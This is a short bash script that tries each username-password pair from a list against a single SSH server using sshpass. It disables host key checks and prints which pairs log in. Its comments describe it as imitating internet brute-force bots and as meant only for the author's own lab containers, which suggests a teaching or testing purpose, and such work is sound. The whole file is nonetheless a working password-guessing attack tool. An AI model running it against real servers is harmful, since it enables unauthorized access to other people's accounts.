#!/bin/bash
# Try each "user password" pair from a list against one SSH server, the way bots on the internet do.
# Lab only: run against our own containers. Usage: guess <host> <list>
host=$1
list=$2
while read -r user pw; do
  sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR \
    -o ConnectTimeout=5 "$user@$host" true 2>/tmp/guess.err
  case $? in
    0) result="LOGGED IN" ;;
    5) result="wrong password" ;;
    *) result=$(tail -1 /tmp/guess.err | sed "s/^$user@$host: //") ;;
  esac
  printf '%-7s %-9s %s\n' "$user" "$pw" "$result"
done < "$list"
